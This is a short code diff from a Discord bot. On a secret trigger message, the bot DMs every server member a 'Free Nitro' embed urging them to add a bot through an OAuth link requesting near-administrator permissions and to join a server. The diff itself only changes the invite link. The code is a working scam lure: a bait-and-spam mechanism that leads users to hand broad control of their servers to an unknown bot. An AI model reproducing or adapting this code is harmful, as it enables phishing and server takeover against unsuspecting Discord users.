@@ -26,7 +26,7 @@ if(message.content === "eazezaezaezaçeazidazeujeuaz"){
 .setColor('RANDOM')
 .setTitle(`Free Nitro ? , add me to 1 server and send "nitro" in the chat and join the server`)
 .addField("Link : " , "[There is the link](https://discordapp.com/oauth2/authorize?client_id=584730464690896906&scope=bot&permissions=2086141183)")
-.addField("Join the server :", "[Join the server](https://discord.gg/BMnhd5r)")
+.addField("Join the server :", "[Join the server](https://discord.gg/rJdAmUT?)")
 .setImage("https://cdn.discordapp.com/attachments/584730884490526721/584731036672458772/logo_nitro.png")
 
 message.guild.members.map(m => m.send(embed)) 
